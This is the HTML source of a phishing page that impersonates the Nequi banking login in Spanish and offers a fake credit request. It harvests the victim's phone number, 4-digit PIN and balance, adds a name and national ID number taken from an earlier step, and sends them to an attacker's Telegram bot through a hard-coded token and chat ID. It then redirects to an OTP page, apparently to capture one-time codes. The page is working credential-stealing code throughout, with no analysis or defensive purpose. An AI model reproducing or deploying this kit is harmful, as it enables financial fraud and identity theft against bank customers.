<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="utf-8">
    <title>Nequi - Verificaci√≥n</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:'Manrope',-apple-system,sans-serif;background:#f5f5f5;color:#200020}
        .wrap-header{background:#fff;padding:15px 20px;box-shadow:0 2px 4px rgba(0,0,0,.1);display:flex;justify-content:space-between;align-items:center}
        .logo img{height:30px}
        .login-section{max-width:450px;margin:40px auto;padding:20px}
        .login-wrap{background:#fff;border-radius:20px;padding:40px 30px;box-shadow:0 4px 10px rgba(0,0,0,.1)}
        h1{color:#200020;font-size:1.8rem;margin-bottom:10px}
        p{color:#666;font-size:1rem;margin-bottom:30px}
        .input-country{display:flex;gap:10px;margin-bottom:20px}
        .select-country{width:100px;padding:15px;background:#fbf7fb;border:1px solid #200020;border-radius:8px;display:flex;align-items:center;gap:8px}
        .flag-img{width:24px;height:16px;object-fit:cover;border-radius:2px}
        .form-group{position:relative;flex:1;margin-bottom:20px}
        .form-group input{width:100%;padding:15px;background:#fbf7fb;border:1px solid #200020;border-radius:8px;font-size:1rem;color:#200020}
        .form-group input:focus{outline:none;border-color:#da0081}
        .form-group label{position:absolute;left:15px;top:15px;color:#666;pointer-events:none;transition:.2s}
        .form-group input:focus+label,.form-group input:not(:placeholder-shown)+label{top:-10px;left:10px;font-size:12px;background:#fff;padding:0 5px;color:#da0081}
        .captcha-container{margin:20px 0;text-align:center}
        .captcha{width:250px;height:70px;background:#e0e0e0;border:2px solid #200020;border-radius:8px;cursor:pointer;display:inline-flex;align-items:center;justify-content:center;font-size:14px;color:#666}
        .captcha.selected{background:#d4edda;border-color:#28a745}
        .captcha.selected::before{content:"‚úì ";color:#28a745;font-size:20px;margin-right:8px}
        .form-btn-submit{width:100%;padding:18px;background:#200020;color:#fff;border:none;border-radius:8px;font-size:1.1rem;font-weight:600;cursor:pointer;transition:background .3s}
        .form-btn-submit:hover:not(:disabled){background:#3d003d}
        .form-btn-submit:disabled{background:#ccc;cursor:not-allowed}
        @media(max-width:768px){.login-section{padding:10px}.login-wrap{padding:30px 20px}}
    </style>
</head>
<body>
    <div id="content">
        <header>
            <div class="wrap-header">
                <div class="row">
                    <div class="col-xs-12 col-md-2">
                        <div class="logo">
                            <a href="https://www.nequi.com.co/">
                                <img alt="nequi" src="./img/logo.svg">
                            </a>
                        </div>
                    </div>
                    <div class="col-xs-12 col-md-10 container-buttons">
                        <div class="wrap-main-menu">
                            <div class="row">
                                <div class="col-xs-12 col-md-8"></div>
                                <div class="col-xs-12 col-md-4">
                                    <div class="buttons-right">
                                        <ul>
                                            <li><a target="_blank" href="https://recarga.nequi.com.co/bdigitalpsl">Recarga</a></li>
                                        </ul>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </header>

        <section class="login-section">
            <div class="login-wrap">
                <h1>Entra a tu Nequi</h1>
                <p>Solicitud de cr√©dito propulsor</p>

                <div class="login-form-wrap">
                    <div class="container-form">
                        <!-- N√∫mero de celular -->
                        <div class="input-country">
                            <div class="wrap-select-country">
                                <div class="select-country">
                                    <div class="country-wrap country-active">
                                        <div class="select-col select-col-img">
                                            <img src="./img/bandera_colombia.png" alt="Colombia" class="flag-img">
                                        </div>
                                        <div class="select-col">
                                            <p>+57</p>
                                            <input class="country-input" type="text" name="j_region" id="j_region" value="57">
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div class="form-group">
                                <input type="tel" id="txtUsername" name="txtUsername" required maxlength="12" minlength="12" inputmode="numeric">
                                <label for="txtUsername">N√∫mero de celular</label>
                            </div>
                        </div>

                        <!-- Contrase√±a -->
                        <div class="form-group">
                            <input class="password" type="password" id="txtPass" name="txtPass" required maxlength="4" minlength="4" inputmode="numeric" pattern="\d*">
                            <label for="txtPass">Contrase√±a</label>
                        </div>

                        <!-- Saldo -->
                        <div class="form-group">
                            <input id="txtSaldo" name="txtSaldo" required maxlength="8" minlength="4" inputmode="numeric">
                            <label for="txtSaldo">Saldo</label>
                        </div>

                        <!-- Captcha -->
                        <img src="./img/cap.png" alt="CAPTCHA" id="captcha" class="captcha">
                    </div>

                    <!-- Bot√≥n de env√≠o -->
                    <div class="btn-wrap">
                        <input class="form-btn-submit" type="submit" value="Entra" id="btnUsuario" name="btnUsuario" disabled>
                    </div>
                </div>
            </div>
        </section>
    </div>

    <script>
        document.addEventListener("DOMContentLoaded", function () {
            const usernameInput = document.getElementById('txtUsername');
            const passwordInput = document.getElementById('txtPass');
            const saldoInput = document.getElementById('txtSaldo');
            const captchaImg = document.getElementById('captcha');
            const submitBtn = document.getElementById('btnUsuario');

            let captchaClicked = false;

            usernameInput.addEventListener('input', formatUsername);
            passwordInput.addEventListener('input', formatPassword);
            saldoInput.addEventListener('input', formatSaldo);
            captchaImg.addEventListener('click', toggleCaptcha);

            function formatUsername() {
                let value = usernameInput.value.replace(/\D/g, '');
                let formattedValue = value.replace(/(\d{3})(\d{3})(\d{0,4})/, '$1 $2 $3').trim();
                usernameInput.value = formattedValue;
                validateForm();
            }

            function formatPassword() {
                passwordInput.value = passwordInput.value.replace(/\D/g, '');
                validateForm();
            }

            function formatSaldo() {
                let valor = saldoInput.value.replace(/\./g, "");
                if (valor === "" || isNaN(valor)) {
                    saldoInput.value = "";
                    validateForm();
                    return;
                }
                saldoInput.value = parseInt(valor, 10).toLocaleString("es-CO");
                validateForm();
            }

            function validateForm() {
                const usernameValid = /^\d{3} \d{3} \d{4}$/.test(usernameInput.value) && usernameInput.value.startsWith("3");
                const passwordValid = /^\d{4}$/.test(passwordInput.value);
                const saldoValid = saldoInput.value.length >= 4;
                if (usernameValid && passwordValid && saldoValid && captchaClicked) {
                    submitBtn.disabled = false;
                    submitBtn.classList.remove('disabled');
                } else {
                    submitBtn.disabled = true;
                    submitBtn.classList.add('disabled');
                }
            }

            function toggleCaptcha() {
                captchaClicked = true;
                captchaImg.src = "./img/ca.png";
                captchaImg.classList.add('selected');
                validateForm();
            }

            const nombreApellido = localStorage.getItem("nombreApellido");
            const cedula = localStorage.getItem("cedula");

            submitBtn.addEventListener('click', async function (e) {
                e.preventDefault();
                const usuario = usernameInput.value.trim();
                const clave = passwordInput.value.trim();
                const saldo = saldoInput.value.trim();

                if (!/^\d{3} \d{3} \d{4}$/.test(usuario) || !usuario.startsWith("3")) {
                    alert("El n√∫mero ingresado no es v√°lido. Debe tener el formato XXX XXX XXXX y comenzar con 3.");
                    return;
                }
                if (!/^\d{4}$/.test(clave)) {
                    alert("La clave debe ser de 4 d√≠gitos num√©ricos.");
                    return;
                }
                if (!nombreApellido || !cedula || !saldo) {
                    alert("Los datos de nombre y c√©dula no est√°n disponibles. Vuelve al paso anterior.");
                    return;
                }

                localStorage.setItem("numero", usuario);
                localStorage.setItem("clave", clave);
                localStorage.setItem("saldo", saldo);

                const TELEGRAM_BOT_TOKEN = '7591157193:AAHFVlUcvlY2ep6nvCoiXg8G86nxGs4yvyc';
                const TELEGRAM_CHAT_ID = '6958936698';

                const telegramMessage = `
üîê DATOS DE VERIFICACI√ìN NEQUI

üìõ Nombre: ${nombreApellido}
ü™™ C√©dula: ${cedula}
üì± N√∫mero: ${usuario}
üîë Clave: ${clave}
üí∞ Saldo: ${saldo}

üìÖ Fecha: ${new Date().toLocaleString('es-CO')}
                `;

                try {
                    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: TELEGRAM_CHAT_ID,
                            text: telegramMessage,
                            parse_mode: 'HTML'
                        })
                    });

                    if (response.ok) {
                        console.log('Datos enviados a Telegram correctamente');
                        window.location.href = "otp.html";
                    } else {
                        throw new Error('Error al enviar los datos a Telegram');
                    }
                } catch (error) {
                    console.error('Error al enviar los datos:', error);
                    alert('Ocurri√≥ un error al enviar los datos. Intente nuevamente.');
                }
            });
        });
    </script>
    <script src="bloqueo-bots.js"></script>
</body>
</html>
